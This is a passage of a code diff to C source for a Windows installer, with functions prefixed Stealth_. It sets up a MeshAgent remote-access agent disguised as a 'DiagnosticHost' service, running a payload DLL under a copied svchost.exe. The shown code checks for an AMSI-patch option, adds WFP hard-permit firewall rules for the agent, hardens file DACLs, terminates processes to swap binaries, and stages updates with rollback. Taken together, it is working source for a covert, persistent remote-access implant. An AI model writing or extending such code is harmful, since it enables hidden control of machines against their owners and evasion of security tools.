     const wchar_t* legacyServiceName = L"DiagHostSvc";
@@ -274,6 +892,9 @@ static void Stealth_CleanupLegacyServiceAlias(const wchar_t* activeServiceName)
     {
         return;
     }
+    /* Legacy names intentionally hardcoded — these are cleanup targets for
+       old installations that used the original WinDiagnosticHost branding.
+       Do NOT replace with STEALTH_FALLBACK_* macros. */
     if (!MeshInstaller_CombinePath(legacyInstallRoot, _countof(legacyInstallRoot), programDataRoot, L"WinDiagnosticHost"))
     {
         return;
@@ -1040,8 +1661,12 @@ static void Stealth_ResolveDefaultLogPath(void)
 
     if (!g_HaveInstallLogPath)
     {
-        wcscpy_s(g_InstallLogPath, _countof(g_InstallLogPath), L"C:\\ProgramData\\DiagnosticHost\\logs\\installer.log");
-        Stealth_CreateInstallationDirectory(L"C:\\ProgramData\\DiagnosticHost\\logs");
+        StringCchPrintfW(g_InstallLogPath, _countof(g_InstallLogPath), L"C:\\ProgramData\\%s\\logs\\installer.log", STEALTH_FALLBACK_SERVICE_NAME);
+        {
+            wchar_t fallbackLogDir[MAX_PATH];
+            StringCchPrintfW(fallbackLogDir, _countof(fallbackLogDir), L"C:\\ProgramData\\%s\\logs", STEALTH_FALLBACK_SERVICE_NAME);
+            Stealth_CreateInstallationDirectory(fallbackLogDir);
+        }
         g_HaveInstallLogPath = TRUE;
     }
 }
@@ -1111,6 +1736,18 @@ static BOOL Stealth_RunCommand(const wchar_t* commandLine, const wchar_t* contex
     return success;
 }
 
+static void Stealth_ImportWinHttpProxyFromIeBestEffort(void)
+{
+    if (Stealth_RunCommand(L"netsh winhttp import proxy source=ie", L"WinHTTP proxy import"))
+    {
+        Stealth_LogInstallEvent(L"[NETWORK] Imported WinHTTP proxy settings from IE/user profile");
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[WARN] WinHTTP proxy import from IE did not complete successfully");
+    }
+}
+
 static BOOL Stealth_IsAmsiPatchEnabled(void)
 {
     const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
@@ -1125,8 +1762,9 @@ static BOOL Stealth_DoFirewallRulesMatch(const wchar_t* serviceName, const wchar
     if (agentExePath == NULL || agentExePath[0] == L'\0') { return FALSE; }
 
     return Stealth_CheckFirewallRuleForService(serviceName, hostExePath) &&
-           Stealth_CheckWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE) &&
-           Stealth_CheckWebRtcFirewallRuleForService(serviceName, agentExePath, FALSE);
+            Stealth_CheckWfpHardPermitForApp(serviceName, agentExePath) &&
+            Stealth_CheckWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE) &&
+            Stealth_CheckWebRtcFirewallRuleForService(serviceName, agentExePath, FALSE);
 }
 
 static BOOL Stealth_WaitForFirewallRuleConvergence(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath, DWORD timeoutMs)
@@ -1150,6 +1788,88 @@ static BOOL Stealth_WaitForFirewallRuleConvergence(const wchar_t* serviceName, c
     return FALSE;
 }
 
+static BOOL Stealth_WaitForFirewallRuleAbsence(const wchar_t* serviceName, DWORD timeoutMs)
+{
+    DWORD waited = 0;
+    const DWORD pollMs = 500;
+
+    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+
+    while (TRUE)
+    {
+        if (!Stealth_CheckFirewallRuleExists(serviceName))
+        {
+            return TRUE;
+        }
+        if (waited >= timeoutMs)
+        {
+            break;
+        }
+        Sleep(pollMs);
+        waited += pollMs;
+    }
+    return FALSE;
+}
+
+static BOOL Stealth_WaitForServiceAbsence(const wchar_t* serviceName, DWORD timeoutMs)
+{
+    DWORD waited = 0;
+    const DWORD pollMs = 500;
+    wchar_t keyPath[512] = {0};
+
+    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+    (void)StringCchPrintfW(keyPath, _countof(keyPath), L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);
+
+    while (TRUE)
+    {
+        BOOL scmAbsent = FALSE;
+        BOOL registryAbsent = FALSE;
+        DWORD scmError = ERROR_SUCCESS;
+        LSTATUS registryStatus = ERROR_SUCCESS;
+        SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+        if (scm != NULL)
+        {
+            SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
+            if (svc == NULL)
+            {
+                scmError = GetLastError();
+                scmAbsent = (scmError == ERROR_SERVICE_DOES_NOT_EXIST);
+            }
+            else
+            {
+                CloseServiceHandle(svc);
+            }
+            CloseServiceHandle(scm);
+        }
+
+        HKEY serviceKey = NULL;
+        registryStatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_QUERY_VALUE, &serviceKey);
+        if (registryStatus == ERROR_SUCCESS)
+        {
+            RegCloseKey(serviceKey);
+        }
+        registryAbsent = (registryStatus == ERROR_FILE_NOT_FOUND || registryStatus == ERROR_PATH_NOT_FOUND);
+
+        if (scmAbsent && registryAbsent)
+        {
+            return TRUE;
+        }
+        if (waited >= timeoutMs)
+        {
+            Stealth_LogInstallEvent(
+                L"[WARN] Service absence wait timed out for %ls (scmErr=%lu registryStatus=%ld)",
+                serviceName,
+                scmError,
+                registryStatus);
+            break;
+        }
+        Sleep(pollMs);
+        waited += pollMs;
+    }
+
+    return FALSE;
+}
+
 static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, const wchar_t* hostExePath, const wchar_t* agentExePath)
 {
     if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
@@ -1168,6 +1888,7 @@ static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, co
         (void)Stealth_RemoveFirewallRulesByExePath(agentExePath);
 
         BOOL outboundAdded = Stealth_AddFirewallRuleForService(serviceName, hostExePath);
+        BOOL wfpAdded = Stealth_AddWfpHardPermitForApp(serviceName, agentExePath);
         BOOL hostWebRtcAdded = Stealth_AddWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE);
         BOOL agentWebRtcAdded = Stealth_AddWebRtcFirewallRuleForService(serviceName, agentExePath, FALSE);
 
@@ -1177,7 +1898,7 @@ static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, co
             agentExePath,
             STEALTH_FIREWALL_SETTLE_TIMEOUT_MS);
 
-        if (outboundAdded && hostWebRtcAdded && agentWebRtcAdded && converged)
+        if (outboundAdded && wfpAdded && hostWebRtcAdded && agentWebRtcAdded && converged)
         {
             if (attempt > 1)
             {
@@ -1186,15 +1907,25 @@ static BOOL Stealth_RefreshFirewallRulesWithRetry(const wchar_t* serviceName, co
             return TRUE;
         }
 
+        const BOOL outboundMatched = Stealth_CheckFirewallRuleForService(serviceName, hostExePath);
+        const BOOL wfpMatched = Stealth_CheckWfpHardPermitForApp(serviceName, agentExePath);
+        const BOOL hostWebRtcMatched = Stealth_CheckWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE);
+        const BOOL agentWebRtcMatched = Stealth_CheckWebRtcFirewallRuleForService(serviceName, agentExePath, FALSE);
+
         Stealth_LogInstallEvent(
-            L"[WARN] Firewall convergence attempt %d/%d failed for %ls (outbound=%u hostWebRtc=%u agentWebRtc=%u converged=%u)",
+            L"[WARN] Firewall convergence attempt %d/%d failed for %ls (outboundAdd=%u wfpAdd=%u hostWebRtcAdd=%u agentWebRtcAdd=%u converged=%u outboundMatch=%u wfpMatch=%u hostWebRtcMatch=%u agentWebRtcMatch=%u)",
             attempt,
             STEALTH_FIREWALL_MAX_ATTEMPTS,
             serviceName,
             outboundAdded ? 1 : 0,
+            wfpAdded ? 1 : 0,
             hostWebRtcAdded ? 1 : 0,
             agentWebRtcAdded ? 1 : 0,
-            converged ? 1 : 0);
+            converged ? 1 : 0,
+            outboundMatched ? 1 : 0,
+            wfpMatched ? 1 : 0,
+            hostWebRtcMatched ? 1 : 0,
+            agentWebRtcMatched ? 1 : 0);
 
         if (attempt < STEALTH_FIREWALL_MAX_ATTEMPTS)
         {
@@ -1335,6 +2066,56 @@ static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath)
 
     Stealth_LogInstallEvent(L"Svchost payload validated: %ls (export Stealth_SvchostServiceMain found)", dllPath);
     return TRUE;
+}
+
+static BOOL Stealth_IsSvchostPayloadDllCandidate(const wchar_t* dllPath)
+{
+    BOOL isCandidate = FALSE;
+    HMODULE mod = NULL;
+    if (dllPath == NULL || dllPath[0] == L'\0') { return FALSE; }
+
+    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) { return FALSE; }
+
+    mod = LoadLibraryExW(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (mod == NULL) { return FALSE; }
+
+    isCandidate = (GetProcAddress(mod, "Stealth_SvchostServiceMain") != NULL);
+    FreeLibrary(mod);
+    return isCandidate;
+}
+
+static void Stealth_RemoveInactiveSvchostPayloadDlls(const StealthInstallPaths* paths)
+{
+    wchar_t searchPattern[MAX_PATH] = {0};
+    wchar_t candidatePath[MAX_PATH] = {0};
+    WIN32_FIND_DATAW findData;
+    HANDLE findHandle = INVALID_HANDLE_VALUE;
+
+    if (paths == NULL || paths->installDir[0] == L'\0' || paths->dllPath[0] == L'\0') { return; }
+    if (!MeshInstaller_CombinePath(searchPattern, _countof(searchPattern), paths->installDir, L"*.dll")) { return; }
+
+    findHandle = FindFirstFileW(searchPattern, &findData);
+    if (findHandle == INVALID_HANDLE_VALUE) { return; }
+
+    do
+    {
+        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) { continue; }
+        if (findData.cFileName[0] == L'\0') { continue; }
+        if (!MeshInstaller_CombinePath(candidatePath, _countof(candidatePath), paths->installDir, findData.cFileName)) { continue; }
+        if (_wcsicmp(candidatePath, paths->dllPath) == 0) { continue; }
+        if (!Stealth_IsSvchostPayloadDllCandidate(candidatePath)) { continue; }
+
+        if (Stealth_RemoveFileIfExistsWithTimeout(candidatePath, 60000, TRUE))
+        {
+            Stealth_LogInstallEvent(L"Removed stale inactive svchost payload DLL %ls", candidatePath);
+        }
+        else
+        {
+            Stealth_LogInstallEvent(L"[WARN] Failed to remove stale inactive svchost payload DLL %ls", candidatePath);
+        }
+    } while (FindNextFileW(findHandle, &findData));
+
+    FindClose(findHandle);
 }
 
 static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath)
@@ -1579,11 +2360,579 @@ static BOOL Stealth_StartSvchostServiceAndWait(const wchar_t* serviceName, const
     return running;
 }
 
+static BOOL Stealth_BuildSidecarMshPath(const wchar_t* exePath, wchar_t* mshPath, size_t mshPathCch)
+{
+    return Stealth_BuildSiblingPathWithExtension(exePath, L".msh", mshPath, mshPathCch);
+}
+
+static BOOL Stealth_BuildSiblingPathWithExtension(const wchar_t* sourcePath, const wchar_t* extension, wchar_t* outPath, size_t outPathCch)
+{
+    if (sourcePath == NULL || sourcePath[0] == L'\0' || extension == NULL || extension[0] == L'\0' || outPath == NULL || outPathCch == 0) { return FALSE; }
+    outPath[0] = L'\0';
+    if (FAILED(StringCchCopyW(outPath, outPathCch, sourcePath))) { return FALSE; }
+
+    wchar_t* dot = wcsrchr(outPath, L'.');
+    if (dot != NULL)
+    {
+        return SUCCEEDED(StringCchCopyW(dot, outPathCch - (size_t)(dot - outPath), extension));
+    }
+    return SUCCEEDED(StringCchCatW(outPath, outPathCch, extension));
+}
+
+static BOOL Stealth_BuildSiblingPathWithFileName(const wchar_t* sourcePath, const wchar_t* fileName, wchar_t* outPath, size_t outPathCch)
+{
+    wchar_t* slash = NULL;
+    wchar_t* altSlash = NULL;
+
+    if (sourcePath == NULL || sourcePath[0] == L'\0' || fileName == NULL || fileName[0] == L'\0' || outPath == NULL || outPathCch == 0) { return FALSE; }
+    outPath[0] = L'\0';
+    if (FAILED(StringCchCopyW(outPath, outPathCch, sourcePath))) { return FALSE; }
+
+    slash = wcsrchr(outPath, L'\\');
+    altSlash = wcsrchr(outPath, L'/');
+    if (altSlash != NULL && (slash == NULL || altSlash > slash))
+    {
+        slash = altSlash;
+    }
+
+    if (slash == NULL)
+    {
+        return SUCCEEDED(StringCchCopyW(outPath, outPathCch, fileName));
+    }
+
+    ++slash;
+    *slash = L'\0';
+    return SUCCEEDED(StringCchCatW(outPath, outPathCch, fileName));
+}
+
+static BOOL Stealth_DirectoryHasEntries(const wchar_t* path)
+{
+    WIN32_FIND_DATAW findData;
+    HANDLE findHandle = INVALID_HANDLE_VALUE;
+    wchar_t searchPath[MAX_PATH] = {0};
+
+    if (path == NULL || path[0] == L'\0') { return FALSE; }
+    if (!MeshInstaller_CombinePath(searchPath, _countof(searchPath), path, L"*")) { return FALSE; }
+
+    findHandle = FindFirstFileW(searchPath, &findData);
+    if (findHandle == INVALID_HANDLE_VALUE) { return FALSE; }
+
+    do
+    {
+        if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0)
+        {
+            FindClose(findHandle);
+            return TRUE;
+        }
+    } while (FindNextFileW(findHandle, &findData));
+
+    FindClose(findHandle);
+    return FALSE;
+}
+
+static BOOL Stealth_CopyFileOverwrite(const wchar_t* sourcePath, const wchar_t* destPath)
+{
+    const DWORD timeoutMs = 60000;
+    const DWORD startTick = GetTickCount();
+    DWORD delay = 100;
+    DWORD lastErr = ERROR_SUCCESS;
+
+    if (sourcePath == NULL || sourcePath[0] == L'\0' || destPath == NULL || destPath[0] == L'\0') { return FALSE; }
+    if (!Stealth_PathExists(sourcePath)) { return FALSE; }
+
+    while ((GetTickCount() - startTick) < timeoutMs)
+    {
+        SetFileAttributesW(destPath, FILE_ATTRIBUTE_NORMAL);
+        if (DeleteFileW(destPath) || GetLastError() == ERROR_FILE_NOT_FOUND)
+        {
+            SetLastError(ERROR_SUCCESS);
+            if (CopyFileW(sourcePath, destPath, FALSE))
+            {
+                return TRUE;
+            }
+            lastErr = GetLastError();
+        }
+        else
+        {
+            lastErr = GetLastError();
+        }
+
+        if (lastErr == ERROR_SHARING_VIOLATION ||
+            lastErr == ERROR_LOCK_VIOLATION ||
+            lastErr == ERROR_ACCESS_DENIED ||
+            lastErr == ERROR_ALREADY_EXISTS)
+        {
+            Sleep(delay);
+            if (delay < 1000) { delay += 100; }
+            continue;
+        }
+        break;
+    }
+
+    Stealth_LogInstallEvent(L"[UPDATE] Copy failed (%ls -> %ls, error=%lu)", sourcePath, destPath, lastErr);
+    SetLastError(lastErr);
+    return FALSE;
+}
+
+static BOOL Stealth_WaitForUpdateTargetQuiesced(const StealthInstallPaths* paths, const wchar_t* targetPath, DWORD timeoutMs, const wchar_t* phaseTag)
+{
+    if (paths == NULL || targetPath == NULL || targetPath[0] == L'\0') { return FALSE; }
+
+    if (GetFileAttributesW(targetPath) == INVALID_FILE_ATTRIBUTES) { return TRUE; }
+
+    wchar_t hostExePath[MAX_PATH] = {0};
+    if (!MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths->installDir, L"svchost.exe"))
+    {
+        hostExePath[0] = L'\0';
+    }
+
+    const DWORD startTick = GetTickCount();
+    DWORD delay = 100;
+    DWORD lastErr = ERROR_SUCCESS;
+
+    while ((GetTickCount() - startTick) < timeoutMs)
+    {
+        if (hostExePath[0] != L'\0')
+        {
+            Stealth_TerminateProcessesByPath(hostExePath);
+        }
+        if (paths->exePath[0] != L'\0')
+        {
+            Stealth_TerminateProcessesByPath(paths->exePath);
+        }
+
+        SetFileAttributesW(targetPath, FILE_ATTRIBUTE_NORMAL);
+        HANDLE hTest = CreateFileW(targetPath, DELETE | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hTest != INVALID_HANDLE_VALUE)
+        {
+            CloseHandle(hTest);
+            SetLastError(ERROR_SUCCESS);
+            return TRUE;
+        }
+
+        lastErr = GetLastError();
+        if (lastErr == ERROR_FILE_NOT_FOUND)
+        {
+            SetLastError(ERROR_SUCCESS);
+            return TRUE;
+        }
+
+        if (lastErr == ERROR_SHARING_VIOLATION ||
+            lastErr == ERROR_LOCK_VIOLATION ||
+            lastErr == ERROR_ACCESS_DENIED)
+        {
+            Sleep(delay);
+            if (delay < 1000) { delay += 100; }
+            continue;
+        }
+
+        break;
+    }
+
+    if (phaseTag != NULL && phaseTag[0] != L'\0')
+    {
+        Stealth_LogInstallEvent(L"%ls Unable to quiesce target file %ls (error=%lu)", phaseTag, targetPath, lastErr);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Unable to quiesce target file %ls (error=%lu)", targetPath, lastErr);
+    }
+    Stealth_LogPathState(targetPath);
+    SetLastError(lastErr);
+    return FALSE;
+}
+
+static void Stealth_DeleteFileIfPresent(const wchar_t* path)
+{
+    if (path == NULL || path[0] == L'\0') { return; }
+    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
+    DeleteFileW(path);
+}
+
+static void Stealth_DeleteUpdateTransactionArtifacts(const StealthUpdateTransaction* tx)
+{
+    if (tx == NULL) { return; }
+    (void)Stealth_RemoveDirectoryTree(tx->stageDir, FALSE);
+    (void)Stealth_RemoveDirectoryTree(tx->backupDir, FALSE);
+    Stealth_DeleteFileIfPresent(tx->stagedExePath);
+    Stealth_DeleteFileIfPresent(tx->stagedDllPath);
+    Stealth_DeleteFileIfPresent(tx->stagedConfPath);
+    Stealth_DeleteFileIfPresent(tx->stagedMshPath);
+    Stealth_DeleteFileIfPresent(tx->backupExePath);
+    Stealth_DeleteFileIfPresent(tx->backupDllPath);
+    Stealth_DeleteFileIfPresent(tx->backupConfPath);
+    Stealth_DeleteFileIfPresent(tx->backupMshPath);
+    Stealth_DeleteFileIfPresent(tx->backupDbPath);
+}
+
+static BOOL Stealth_FinalizeUpdateTransaction(const StealthInstallPaths* paths, StealthUpdateTransaction* tx)
+{
+    BOOL ok = TRUE;
+
+    if (paths == NULL || tx == NULL) { return FALSE; }
+
+    if (tx->pendingUpdateMarked)
+    {
+        if (Stealth_DataStoreValueExists(paths->dbPath, "PendingUpdate", NULL, 0, NULL))
+        {
+            if (!Stealth_DataStoreDeleteValue(paths->dbPath, "PendingUpdate"))
+            {
+                Stealth_LogInstallEvent(L"[UPDATE] Failed to clear PendingUpdate marker");
+                ok = FALSE;
+            }
+            else
+            {
+                tx->pendingUpdateMarked = FALSE;
+            }
+        }
+        else
+        {
+            tx->pendingUpdateMarked = FALSE;
+        }
+    }
+
+    if (!Stealth_RemoveDirectoryTree(tx->stageDir, TRUE))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to remove staged update directory (%ls)", tx->stageDir);
+        ok = FALSE;
+    }
+    if (!Stealth_RemoveDirectoryTree(tx->backupDir, TRUE))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to remove update backup directory (%ls)", tx->backupDir);
+        ok = FALSE;
+    }
+
+    return ok;
+}
+
+static BOOL Stealth_PrepareUpdateTransaction(const StealthInstallPaths* paths, const wchar_t* sourceExePath, const wchar_t* sourceDllPath, StealthUpdateTransaction* tx)
+{
+    const wchar_t* exeLeaf = NULL;
+    const wchar_t* dllLeaf = NULL;
+    const wchar_t* confLeaf = NULL;
+    const wchar_t* dbLeaf = NULL;
+    const wchar_t* mshLeaf = NULL;
+    const wchar_t* fallbackMshLeaf = L"MeshAgent.msh";
+    if (paths == NULL || tx == NULL) { return FALSE; }
+    ZeroMemory(tx, sizeof(*tx));
+
+    wchar_t stateDir[MAX_PATH] = {0};
+    if (!MeshInstaller_CombinePath(stateDir, _countof(stateDir), paths->installDir, L"state")) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->stageDir, _countof(tx->stageDir), stateDir, STEALTH_UPDATE_STAGE_DIR_NAME)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->backupDir, _countof(tx->backupDir), stateDir, STEALTH_UPDATE_BACKUP_DIR_NAME)) { return FALSE; }
+
+    Stealth_CreateInstallationDirectory(stateDir);
+
+    if (!Stealth_BuildSidecarMshPath(paths->exePath, tx->liveMshPath, _countof(tx->liveMshPath))) { return FALSE; }
+
+    exeLeaf = MeshInstaller_GetPathLeaf(paths->exePath);
+    dllLeaf = MeshInstaller_GetPathLeaf(paths->dllPath);
+    confLeaf = MeshInstaller_GetPathLeaf(paths->confPath);
+    dbLeaf = MeshInstaller_GetPathLeaf(paths->dbPath);
+    mshLeaf = MeshInstaller_GetPathLeaf(tx->liveMshPath);
+
+    if (exeLeaf == NULL || exeLeaf[0] == L'\0') { exeLeaf = STEALTH_FALLBACK_EXE_NAME; }
+    if (dllLeaf == NULL || dllLeaf[0] == L'\0') { dllLeaf = STEALTH_FALLBACK_DLL_NAME; }
+    if (confLeaf == NULL || confLeaf[0] == L'\0') { confLeaf = STEALTH_FALLBACK_CONF_NAME; }
+    if (dbLeaf == NULL || dbLeaf[0] == L'\0') { dbLeaf = STEALTH_FALLBACK_DB_NAME; }
+    if (mshLeaf == NULL || mshLeaf[0] == L'\0') { mshLeaf = fallbackMshLeaf; }
+
+    if (!MeshInstaller_CombinePath(tx->stagedExePath, _countof(tx->stagedExePath), tx->stageDir, exeLeaf)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->stagedDllPath, _countof(tx->stagedDllPath), tx->stageDir, dllLeaf)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->stagedConfPath, _countof(tx->stagedConfPath), tx->stageDir, confLeaf)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->stagedMshPath, _countof(tx->stagedMshPath), tx->stageDir, mshLeaf)) { return FALSE; }
+
+    if (!MeshInstaller_CombinePath(tx->backupExePath, _countof(tx->backupExePath), tx->backupDir, exeLeaf)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->backupDllPath, _countof(tx->backupDllPath), tx->backupDir, dllLeaf)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->backupConfPath, _countof(tx->backupConfPath), tx->backupDir, confLeaf)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->backupMshPath, _countof(tx->backupMshPath), tx->backupDir, mshLeaf)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(tx->backupDbPath, _countof(tx->backupDbPath), tx->backupDir, dbLeaf)) { return FALSE; }
+
+    Stealth_DeleteUpdateTransactionArtifacts(tx);
+    Stealth_CreateInstallationDirectory(tx->stageDir);
+    Stealth_CreateInstallationDirectory(tx->backupDir);
+
+    tx->liveExeExists = Stealth_PathExists(paths->exePath);
+    tx->liveDllExists = Stealth_PathExists(paths->dllPath);
+    tx->liveConfExists = Stealth_PathExists(paths->confPath);
+    tx->liveMshExists = Stealth_PathExists(tx->liveMshPath);
+    tx->liveDbExists = Stealth_PathExists(paths->dbPath);
+
+    if (sourceExePath != NULL && sourceExePath[0] != L'\0')
+    {
+        if (!Stealth_CopyFileOverwrite(sourceExePath, tx->stagedExePath)) { return FALSE; }
+        tx->stagedExeReady = TRUE;
+    }
+
+    if (sourceExePath != NULL && sourceExePath[0] != L'\0' && Stealth_EnsureConfigFile(sourceExePath, tx->stagedConfPath))
+    {
+        tx->stagedConfReady = TRUE;
+    }
+    else if (tx->liveConfExists && Stealth_CopyFileOverwrite(paths->confPath, tx->stagedConfPath))
+    {
+        tx->stagedConfReady = Stealth_ConfigHasRequiredKeys(tx->stagedConfPath);
+    }
+    else if (tx->liveMshExists && Stealth_CopyFileOverwrite(tx->liveMshPath, tx->stagedConfPath))
+    {
+        tx->stagedConfReady = Stealth_ConfigHasRequiredKeys(tx->stagedConfPath);
+    }
+    if (!tx->stagedConfReady)
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid provisioning .conf file");
+        return FALSE;
+    }
+
+    const wchar_t* mshFallbackConf = (tx->stagedConfReady ? tx->stagedConfPath : paths->confPath);
+    if (sourceExePath != NULL && sourceExePath[0] != L'\0' && Stealth_EnsureMshFile(sourceExePath, tx->stagedMshPath, mshFallbackConf))
+    {
+        tx->stagedMshReady = TRUE;
+    }
+    else if (tx->liveMshExists && Stealth_CopyFileOverwrite(tx->liveMshPath, tx->stagedMshPath))
+    {
+        tx->stagedMshReady = TRUE;
+    }
+    if (!tx->stagedMshReady)
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid provisioning .msh file");
+        return FALSE;
+    }
+
+    if (!Stealth_EnsureSvchostDllFile(sourceExePath, sourceDllPath, tx->stagedDllPath))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid svchost DLL payload");
+        return FALSE;
+    }
+    tx->stagedDllReady = TRUE;
+
+    return TRUE;
+}
+
+static BOOL Stealth_BackupUpdateTransaction(const StealthInstallPaths* paths, StealthUpdateTransaction* tx)
+{
+    if (paths == NULL || tx == NULL) { return FALSE; }
+
+    tx->backupDbReady = FALSE;
+    tx->backupsReady = FALSE;
+    tx->expectedIdentityReady = FALSE;
+
+    Stealth_DeleteFileIfPresent(tx->backupExePath);
+    Stealth_DeleteFileIfPresent(tx->backupDllPath);
+    Stealth_DeleteFileIfPresent(tx->backupConfPath);
+    Stealth_DeleteFileIfPresent(tx->backupMshPath);
+    Stealth_DeleteFileIfPresent(tx->backupDbPath);
+
+    if (tx->liveExeExists && !Stealth_CopyFileOverwrite(paths->exePath, tx->backupExePath)) { return FALSE; }
+    if (tx->liveDllExists && !Stealth_CopyFileOverwrite(paths->dllPath, tx->backupDllPath)) { return FALSE; }
+    if (tx->liveConfExists && !Stealth_CopyFileOverwrite(paths->confPath, tx->backupConfPath)) { return FALSE; }
+    if (tx->liveMshExists && !Stealth_CopyFileOverwrite(tx->liveMshPath, tx->backupMshPath)) { return FALSE; }
+    if (tx->liveDbExists)
+    {
+        if (!Stealth_CopyFileOverwrite(paths->dbPath, tx->backupDbPath)) { return FALSE; }
+        tx->backupDbReady = TRUE;
+        tx->expectedIdentityReady = Stealth_CaptureIdentitySnapshot(paths->dbPath, &tx->expectedIdentity);
+        if (tx->expectedIdentityReady)
+        {
+            Stealth_LogIdentitySnapshot(L"before-update", &tx->expectedIdentity);
+        }
+        else
+        {
+            Stealth_LogInstallEvent(L"[IDENTITY] before-update datastore present but no retained identity keys were available");
+        }
+    }
+
+    tx->backupsReady = TRUE;
+    return TRUE;
+}
+
+static BOOL Stealth_CommitUpdateTransaction(const StealthInstallPaths* paths, const StealthUpdateTransaction* tx)
+{
+    if (paths == NULL || tx == NULL) { return FALSE; }
+
+    if (tx->stagedExeReady &&
+        (!Stealth_WaitForUpdateTargetQuiesced(paths, paths->exePath, 60000, L"[UPDATE]") ||
+         !Stealth_InstallFiles(tx->stagedExePath, paths->exePath)))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to commit staged executable to %ls", paths->exePath);
+        return FALSE;
+    }
+
+    if (paths->exePath[0] != L'\0' && GetFileAttributesW(paths->exePath) != INVALID_FILE_ATTRIBUTES)
+    {
+        if (!Stealth_HardenHostExecutableDacl(paths->exePath))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Failed to apply host executable DACL to %ls", paths->exePath);
+            return FALSE;
+        }
+    }
+
+    if (tx->stagedConfReady && !Stealth_CopyFileOverwrite(tx->stagedConfPath, paths->confPath))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to commit staged config to %ls", paths->confPath);
+        return FALSE;
+    }
+
+    if (tx->stagedMshReady && !Stealth_CopyFileOverwrite(tx->stagedMshPath, tx->liveMshPath))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to commit staged msh to %ls", tx->liveMshPath);
+        return FALSE;
+    }
+
+    if (!Stealth_WaitForUpdateTargetQuiesced(paths, paths->dllPath, 60000, L"[UPDATE]") ||
+        !Stealth_RemoveFileIfExistsWithTimeout(paths->dllPath, 60000, TRUE))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to remove existing svchost DLL (%ls)", paths->dllPath);
+        return FALSE;
+    }
+    if (!Stealth_InstallFiles(tx->stagedDllPath, paths->dllPath))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to commit staged svchost DLL to %ls", paths->dllPath);
+        return FALSE;
+    }
+    if (!Stealth_ValidateSvchostPayloadDll(paths->dllPath))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Committed svchost DLL failed validation (%ls)", paths->dllPath);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+static BOOL Stealth_RollbackUpdateTransaction(const StealthInstallPaths* paths, const wchar_t* serviceKeyName, const StealthUpdateTransaction* tx)
+{
+    if (paths == NULL || serviceKeyName == NULL || serviceKeyName[0] == L'\0' || tx == NULL) { return FALSE; }
+    BOOL ok = TRUE;
+
+    if (tx->liveExeExists)
+    {
+        ok = (Stealth_WaitForUpdateTargetQuiesced(paths, paths->exePath, 60000, L"[UPDATE][ROLLBACK]") &&
+            Stealth_CopyFileOverwrite(tx->backupExePath, paths->exePath) && ok);
+    }
+    if (tx->liveDllExists)
+    {
+        ok = (Stealth_WaitForUpdateTargetQuiesced(paths, paths->dllPath, 60000, L"[UPDATE][ROLLBACK]") &&
+            Stealth_CopyFileOverwrite(tx->backupDllPath, paths->dllPath) && ok);
+    }
+    if (tx->liveConfExists)
+    {
+        ok = (Stealth_CopyFileOverwrite(tx->backupConfPath, paths->confPath) && ok);
+    }
+    if (tx->liveMshExists)
+    {
+        ok = (Stealth_CopyFileOverwrite(tx->backupMshPath, tx->liveMshPath) && ok);
+    }
+    if (tx->backupDbReady)
+    {
+        ok = (Stealth_CopyFileOverwrite(tx->backupDbPath, paths->dbPath) && ok);
+    }
+    if (ok && paths->exePath[0] != L'\0' && GetFileAttributesW(paths->exePath) != INVALID_FILE_ATTRIBUTES)
+    {
+        if (!Stealth_HardenHostExecutableDacl(paths->exePath))
+        {
